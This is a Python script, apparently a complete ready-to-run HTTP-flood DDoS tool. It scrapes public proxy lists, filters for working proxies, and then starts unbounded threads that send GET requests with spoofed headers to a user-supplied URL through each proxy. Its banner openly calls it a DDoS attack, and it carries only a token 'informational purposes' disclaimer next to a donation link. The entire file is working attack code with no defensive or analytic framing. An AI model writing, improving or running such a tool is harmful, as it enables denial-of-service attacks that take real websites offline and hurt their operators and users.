#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Dev: FSystem88
# Version: 3
import requests as r, os, threading, sys, random, re, time, click, fake_headers
from threading import Thread
from colorama import Fore, Style, Back
from fake_headers import Headers

def clear(): 
	if os.name == 'nt': 
		os.system('cls') 
	else: 
		os.system('clear')

def check_prox(array, qtime, url):
	ip = r.post("http://fsystem88.ru/ip").text
	for prox in array:
		thread_list = []
		t = threading.Thread (target=check, args=(ip, prox, qtime, url))
		thread_list.append(t)
		t.start()

def check(ip, prox, qtime, url):
	try:
		ipx = r.get("http://fsystem88.ru/ip", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}, timeout=qtime).text
	except:
		ipx = ip
	if ip != ipx:
		print(Fore.BLACK+Back.GREEN+"{} good! Starting...".format(prox)+Style.RESET_ALL)
		thread_list = []
		t = threading.Thread (target=ddos, args=(prox, url))
		thread_list.append(t)
		t.start()

def ddos(prox, url):
	proxies={"http":"http://{}".format(prox), "https":"http://{}".format(prox)}
	colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.CYAN, Fore.MAGENTA, Fore.WHITE]
	color = random.choice(colors)
	while True:
		headers = Headers(headers=True).generate()
		thread_list = []
		t = threading.Thread (target=start_ddos, args=(prox, url, headers, proxies, color))
		thread_list.append(t)
		t.start()

def start_ddos(prox, url, headers, proxies, color):
	try:
		s = r.Session()
		req = s.get(url, headers=headers, proxies=proxies)
		if req.status_code == 200:
			print(color+"{} send requests...".format(prox))
	except:
		pass

@click.command()
@click.option('--proxy', '-p', help="File with a proxy")
@click.option('--url', '-u', help="URL")
def main(proxy, url):
	clear()
	def logo():
		print(Fore.GREEN+"\n██████"+Fore.RED+"╗░"+Fore.GREEN+"██████"+Fore.RED+"╗░░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╗"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██████"+Fore.RED+"╗░"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔════╝"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║╚"+Fore.GREEN+"█████"+Fore.RED+"╗░"+Fore.GREEN+"█████"+Fore.RED+"╗░░"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"\n"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║░╚═══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"╔══╝░░"+Fore.GREEN+"██"+Fore.RED+"╔══"+Fore.GREEN+"██"+Fore.RED+"╗"+Fore.GREEN+"\n"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝╚"+Fore.GREEN+"█████"+Fore.RED+"╔╝"+Fore.GREEN+"██████"+Fore.RED+"╔╝"+Fore.GREEN+"███████"+Fore.RED+"╗"+Fore.GREEN+"██"+Fore.RED+"║░░"+Fore.GREEN+"██"+Fore.RED+"║"+Fore.GREEN+"\n"+Fore.RED+"╚═════╝░╚═════╝░░╚════╝░╚═════╝░╚══════╝╚═╝░░╚═╝"+Fore.YELLOW+"\n\n[ Dev: FSystem88 ~ prod. by Ca$h&Мир ]\n[ The program uses a simple type of DDoS attack\n  \"HTTP flood\" using multithreading and a proxies ]\n[ The program was created for informational purposes !!! ]\n\n"+Fore.GREEN+"[  Qiwi: https://qiwi.com/n/FSYSTEM88  ]\n"+Style.RESET_ALL)
	logo()
	if url == None:
		url = input("URL: ")
	if url[:4] != "http":
		print(Fore.RED+"Enter the full URL (example: http*://****.**/)"+Style.RESET_ALL)
		exit()
	if proxy == None:
		req = r.get("https://api.proxyscrape.com/?request=displayproxies")
		array = req.text.split()
		qtime = input("Timeout of requests (default 5): ")
		try:
			if qtime == "":
				qtime = 5
			else:
				qtime = int(qtime)
		except:
			print(Fore.RED+"Incorrect timeout"+Style.RESET_ALL)
			exit()
		check_prox(array, qtime, url)
	else:
		try:
			fx = open(proxy)
			array = fx.read().split()
			qtime = input("Found {} proxies in {}.\nTimeout of requests (default 5): ".format(len(array), proxy))
			try:
				if qtime == "":
					qtime = 5
				else:
					qtime = int(qtime)
			except:
				print(Fore.RED+"Incorrect timeout"+Style.RESET_ALL)
				exit()
			check_prox(array, qtime, url)
		except FileNotFoundError:
			print(Fore.RED+"File {} not found.".format(proxy)+Style.RESET_ALL)
			exit()

main()
